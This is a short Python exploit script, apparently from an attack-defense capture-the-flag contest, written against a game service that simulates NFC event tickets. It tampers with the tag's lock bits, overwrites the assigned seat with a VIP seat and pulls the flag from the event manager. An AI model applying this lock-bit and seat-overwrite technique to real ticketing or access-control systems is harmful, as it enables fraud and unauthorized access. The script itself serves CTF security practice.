#!/usr/bin/env python3

import sys

from util import *
from util.constants import NFCTAG_SEAT_PAGE


WALLET_PORT = 1337
MANAGER_PORT = 1338


def exploit(ip, flag_id):
    event_id = bytes.fromhex(flag_id)

    with Wallet(ip, WALLET_PORT) as wallet:
        ticket_id = wallet.buy_user(event_id, b'X')
        data = wallet.read_page(ticket_id, 2)

        # Overwrite lock bits to lock the lock bits themselves
        data = data[:2] + b'\x06\x00'
        wallet.write_page(ticket_id, 2, data)

        with EventManager(ip, MANAGER_PORT) as evtman:
            # Event manager will assign a seat but fail to lock the page
            evtman.join_event(event_id, wallet.wallet_id, ticket_id, as_vip=False)
            # Overwrite assigned seat with a seat < 100 (VIP)
            wallet.write_page(ticket_id, NFCTAG_SEAT_PAGE, b'10\x00\x00')
            # Now we can safely sit first row and get the star autograph (flag)
            evtman.sit(10, as_vip=True)
            flag = evtman.ask_star_autograph(as_vip=True)

    return flag.decode()


if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))
